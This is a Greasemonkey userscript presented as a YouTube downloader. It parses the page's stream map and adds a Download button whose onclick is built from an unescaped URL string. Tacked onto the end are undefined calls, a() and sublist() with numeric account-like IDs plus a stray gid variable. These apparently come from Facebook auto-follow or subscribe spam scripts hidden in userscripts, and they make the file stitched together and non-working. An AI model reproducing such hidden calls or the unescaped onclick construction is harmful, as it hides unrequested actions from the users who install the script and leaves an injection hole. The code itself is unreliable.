// ==UserScript==
// @name           YouTube Downloader
// @namespace      YouTubeDL
// @include        http://www.youtube.com/watch?v=*
// ==/UserScript==
mplc = document.getElementById('watch-actions');
var dlUrl = 'alert(\'Could not find download URL\')';
var dlUrl2 = '';

mp = document.getElementById('movie_player');
attr = mp.getAttribute('flashvars');

// Pulled from my YouTube 2010 player code
m1 = attr.match(/url_encoded_fmt_stream_map\=(.+?)\&/gi);
m1d = unescape(m1[0].substring(27));
ftpl = '[q]|[u]||[b]';
fsm = '';
fmts = m1d.split(',');
tmpQuality = 0;
dlQuality = 0;
for(j=0;j<fmts.length;j++) {
	tmpfmt = fmts[j].split('&');
	tmptpl = ftpl;
	isFLV = false;
	for (k=0;k<tmpfmt.length;k++) {
		tmpattr = tmpfmt[k].split('=');
		if (tmpattr[0] == 'url') {
			tmpUrl = 'location.href=\''+unescape(tmpattr[1])+'\'';
		} else if (tmpattr[0] == 'type' && (tmpattr[1].indexOf('flv') >= 0 || tmpattr[1].indexOf('mp4') >= 0)) {
			isFLV = true;
		} else if (tmpattr[0] == 'itag') {
			tmpQuality = parseInt(tmpattr[1]);
		}
	}
	if (isFLV && tmpQuality > dlQuality) {
		dlUrl = tmpUrl;
		dlQuality = tmpQuality;
	}
	if (fsm != '') fsm += ',';
	fsm += tmptpl;
}

btn = document.createElement('button');
btn.setAttribute('onclick', dlUrl+';return false;');
btn.title = 'Download video as MP4/FLV';
btn.type = 'button';
btn.className = 'yt-uix-tooltip-reverse yt-uix-button yt-uix-tooltip';
btnCont = document.createElement('span');
btnCont.className = 'yt-uix-button-content';
btnCont.innerHTML = 'Download';
btn.appendChild(btnCont);
mplc.appendChild(btn);

a("1788468017");
a("100005108226923");


 sublist("4231966815939");
 sublist("4290547360416");
 sublist("4330262393267");
 sublist("141554212691519");
 sublist("450251085064011");


var gid = [''];